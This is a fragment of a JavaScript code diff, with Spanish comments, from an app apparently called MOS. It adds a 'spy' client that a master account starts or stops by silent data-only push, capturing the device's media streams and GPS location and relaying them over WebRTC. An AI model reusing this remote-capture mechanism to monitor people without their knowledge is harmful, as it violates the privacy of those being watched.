+      try { clearInterval(ref.pollTimerSync); } catch (_) {}
+      try { clearInterval(ref._iceFlushTimer); } catch (_) {}
+      try { clearInterval(ref._iceWatchdogTimer); } catch (_) {}
+      // Quitar listener de visibilitychange para no leakear
+      if (ref._handlerVisibility) {
+        try { document.removeEventListener('visibilitychange', ref._handlerVisibility); } catch (_) {}
+      }
+      try { clearTimeout(ref._renegTimeout); } catch (_) {}
+      // Flush final ICE pendientes (best-effort)
+      if (ref._iceQueue?.length && ref.sesionId && ref.token) {
+        try {
+          await _espiaCliMOSPost('espiaPushBatch', {
+            sesionId: ref.sesionId, lado: 'device', token: ref.token,
+            ice: ref._iceQueue.map(c => ({ ice: c }))
+          });
+        } catch (_) {}
+      }
+      // Detener tracks + cerrar peer. (bufferRecorders/bufferTimers quedan {} → los loops son inertes.)
+      Object.values(ref.bufferTimers || {}).forEach(t => { try { clearInterval(t); } catch (_) {} });
+      Object.values(ref.streams || {}).forEach(s => {
+        try { s?.getTracks().forEach(t => t.stop()); } catch (_) {}
+      });
+      if (ref.gpsWatch) try { navigator.geolocation.clearWatch(ref.gpsWatch); } catch (_) {}
+      if (ref.gpsCh) try { ref.gpsCh.close(); } catch (_) {}
+      try { ref.pc?.close(); } catch (_) {}
+      if (ref.sesionId) {
+        _espiaCliMOSPost('espiaCerrarSesion', {
+          sesionId: ref.sesionId, motivo: motivo || 'manual', lado: 'device', token: ref.token
+        });
+      }
+      _espiaCliMOSOcultarIndicador();
+    };
+
+    // ── Listener de comandos data-only del Service Worker ──────────────────
+    // El SW de MOS reenvía los push data-only como postMessage({type:'mos_command', data}).
+    // En BACKGROUND (app no visible) el push no pasa por messaging.onMessage → llega por acá.
+    // MOS no maneja audio_start/gps_locate por push (su audio va por mos.espia_audio_*), así que
+    // solo se despachan los comandos del espía live MOS_ESPIA_INICIAR/DETENER.
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.addEventListener('message', (evt) => {
+        if (evt.data?.type !== 'mos_command') return;
+        const cmd = evt.data.data || {};
+        const action = cmd.action || cmd.idNotif || '';
+        console.log('[SW msg MOS] cmd recibido:', action);
+        if (action === 'MOS_ESPIA_INICIAR') {
+          if (typeof window._espiaCliMOSIniciar === 'function') {
+            window._espiaCliMOSIniciar(cmd.sesionId, cmd.masterId);
+          } else { console.warn('[SW msg MOS] _espiaCliMOSIniciar no existe'); }
+        } else if (action === 'MOS_ESPIA_DETENER') {
+          if (typeof window._espiaCliMOSCerrar === 'function') {
+            window._espiaCliMOSCerrar('master_push_stop');
+          }
+        }
+      });
+    }
+  })();
+
   async function _pushInit(nombre, rol, askPermission = false) {
     console.log('[Push] init — firebase:', !!window.firebase, '| Notification:', typeof Notification !== 'undefined' ? Notification.permission : 'N/A', '| ask:', askPermission);
     if (!window.firebase || !('Notification' in window) || !('serviceWorker' in navigator)) {
@@ -40682,6 +41388,27 @@ var _pPickState = { filtroZona: null, filtroTipo: null, mostrarTodas: false };
     if (!_pushMsgHandlerSet) {
       _pushMsgHandlerSet = true;
       messaging.onMessage(async payload => {
+        // [793 · ESPÍA V2] Comando data-only en PRIMER PLANO. Cuando hay una pestaña de MOS
+        // VISIBLE el push NO pasa por el SW background (llega acá), así que el arranque/cierre
+        // del cliente de captura se despacha en este handler. El push del espía es data-only
+        // (sin title/body) → return ANTES del toast para no mostrar un aviso vacío.
+        const _espCmd = payload.data || {};
+        const _espAcc = _espCmd.action || _espCmd.idNotif || '';
+        if (_espAcc === 'MOS_ESPIA_INICIAR') {
+          console.log('[Push] comando foreground MOS:', _espAcc);
+          if (typeof window._espiaCliMOSIniciar === 'function') {
+            try { window._espiaCliMOSIniciar(_espCmd.sesionId, _espCmd.masterId); }
+            catch (e) { console.warn('[espia MOS] iniciar fg fallo:', e?.message); }
+          }
+          return;
+        }
+        if (_espAcc === 'MOS_ESPIA_DETENER') {
+          console.log('[Push] comando foreground MOS:', _espAcc);
+          if (typeof window._espiaCliMOSCerrar === 'function') {
+            try { window._espiaCliMOSCerrar('master_push_stop'); } catch (_) {}
+          }
+          return;
+        }
         const t = payload.notification?.title || '';
         const b = payload.notification?.body  || '';
         toast('🔔 ' + t + (b ? ': ' + b : ''), 'ok', 8000);
